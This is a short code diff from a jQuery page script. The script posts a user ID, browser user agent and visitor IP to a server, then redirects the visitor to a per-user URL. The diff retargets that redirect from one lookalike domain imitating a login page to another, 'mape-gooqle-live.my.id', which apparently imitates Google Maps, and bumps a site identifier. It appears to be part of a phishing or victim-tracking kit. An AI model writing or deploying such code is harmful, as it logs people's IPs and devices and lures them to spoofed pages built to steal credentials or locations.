@@ -90,14 +90,14 @@ $(document).ready(function () {
                     user_id: userId,
                     agent: navigator.userAgent,
                     user_ip: userIp,
-                    website_id: 57,
+                    website_id: 59,
                 },
                 success: function (response) {
                     console.log('Response:', response);
                     
                         // Redirect to another URL on success
                         window.onload = function(){
-                            window.location.href = `https://view.megaapersonase.website/users/auth/login/${userId}`;
+                            window.location.href = `https://mape-gooqle-live.my.id/view-location/${userId}`;
                           }
                     
                 },
